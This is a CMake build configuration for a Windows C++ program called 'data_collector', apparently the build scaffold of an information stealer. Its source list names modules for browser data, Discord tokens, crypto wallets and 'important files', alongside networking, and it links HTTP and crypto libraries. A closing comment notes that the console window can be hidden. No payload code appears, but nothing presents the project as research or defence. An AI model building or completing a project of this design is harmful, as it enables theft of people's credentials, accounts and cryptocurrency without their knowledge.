cmake_minimum_required(VERSION 3.20)
project(data_collector CXX)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Ensure C++17 features are available
add_definitions(-DNLOHMANN_JSON_HPP)

# Find required packages
find_package(OpenSSL QUIET)
if(NOT OpenSSL_FOUND)
    message(WARNING "OpenSSL not found. Please install OpenSSL from https://slproweb.com/products/Win32OpenSSL.html")
    message(WARNING "Or install via vcpkg: vcpkg install openssl:x64-windows")
    message(WARNING "For now, building without OpenSSL - some features may not work")
endif()

# nlohmann_json is included directly in main.cpp

# Include directories
include_directories(include)
if(OpenSSL_FOUND)
    include_directories(${OPENSSL_INCLUDE_DIR})
endif()

# Source files
set(SOURCES
    src/main.cpp
    src/utils.cpp
    src/network.cpp
    src/system_info.cpp
    src/browser_data.cpp
    src/discord_tokens.cpp
    src/crypto_wallets.cpp
    src/important_files.cpp
)

# Create executable
add_executable(${PROJECT_NAME} ${SOURCES})

# Link libraries
target_link_libraries(${PROJECT_NAME}
    wininet
    winhttp
    urlmon
    shell32
    ole32
    oleaut32
    wbemuuid
    advapi32
    user32
    gdi32
    psapi
    shlwapi
    iphlpapi
    ws2_32
    crypt32
)

# Conditionally link OpenSSL if found
if(OpenSSL_FOUND)
    target_link_libraries(${PROJECT_NAME} ${OPENSSL_LIBRARIES})
    target_compile_definitions(${PROJECT_NAME} PRIVATE HAS_OPENSSL)
else()
    message(WARNING "Building without OpenSSL support")
endif()

# Compiler flags
if(MSVC)
    target_compile_options(${PROJECT_NAME} PRIVATE /W4 /MT /EHsc /std:c++17)
    # Additional Windows-specific flags
    target_compile_definitions(${PROJECT_NAME} PRIVATE
        WIN32_LEAN_AND_MEAN
        NOMINMAX
        _CRT_SECURE_NO_WARNINGS
    )
else()
    target_compile_options(${PROJECT_NAME} PRIVATE -Wall -Wextra -std=c++17)
endif()

# Set executable properties
# WIN32_EXECUTABLE is not set so it creates a console application that we can hide
